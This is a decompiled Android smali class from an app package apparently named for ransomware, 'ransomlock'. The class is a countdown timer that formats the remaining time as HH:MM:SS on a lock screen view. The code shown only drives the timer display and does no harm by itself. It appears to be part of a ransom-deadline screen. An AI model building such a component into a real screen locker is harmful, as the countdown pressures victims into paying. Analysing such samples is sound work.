.class Lcom/kithub/ransomlock/LockActivity$2;
.super Landroid/os/CountDownTimer;
.source "LockActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/kithub/ransomlock/LockActivity;->startCountdownIfNeeded()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/kithub/ransomlock/LockActivity;


# direct methods
.method constructor <init>(Lcom/kithub/ransomlock/LockActivity;JJ)V
    .locals 0
    .param p1, "this$0"    # Lcom/kithub/ransomlock/LockActivity;
    .param p2, "arg0"    # J
    .param p4, "arg1"    # J
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010,
            0x0,
            0x0
        }
        names = {
            null,
            null,
            null
        }
    .end annotation

    .line 74
    iput-object p1, p0, Lcom/kithub/ransomlock/LockActivity$2;->this$0:Lcom/kithub/ransomlock/LockActivity;

    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 2

    .line 87
    iget-object v0, p0, Lcom/kithub/ransomlock/LockActivity$2;->this$0:Lcom/kithub/ransomlock/LockActivity;

    invoke-static {v0}, Lcom/kithub/ransomlock/LockActivity;->-$$Nest$fgettimerView(Lcom/kithub/ransomlock/LockActivity;)Landroid/widget/TextView;

    move-result-object v0

    const-string v1, "00:00:00"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 88
    return-void
.end method

.method public onTick(J)V
    .locals 13
    .param p1, "millisUntilFinished"    # J

    .line 77
    const-wide/16 v0, 0x3e8

    div-long v0, p1, v0

    .line 78
    .local v0, "totalSec":J
    const-wide/16 v2, 0xe10

    div-long v4, v0, v2

    .line 79
    .local v4, "h":J
    rem-long v2, v0, v2

    const-wide/16 v6, 0x3c

    div-long/2addr v2, v6

    .line 80
    .local v2, "m":J
    rem-long v6, v0, v6

    .line 81
    .local v6, "s":J
    iget-object v8, p0, Lcom/kithub/ransomlock/LockActivity$2;->this$0:Lcom/kithub/ransomlock/LockActivity;

    invoke-static {v8}, Lcom/kithub/ransomlock/LockActivity;->-$$Nest$fgettimerView(Lcom/kithub/ransomlock/LockActivity;)Landroid/widget/TextView;

    move-result-object v8

    sget-object v9, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v10

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v11

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v12

    filled-new-array {v10, v11, v12}, [Ljava/lang/Object;

    move-result-object v10

    const-string v11, "%02d:%02d:%02d"

    invoke-static {v9, v11, v10}, Ljava/lang/String;->format(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 82
    return-void
.end method
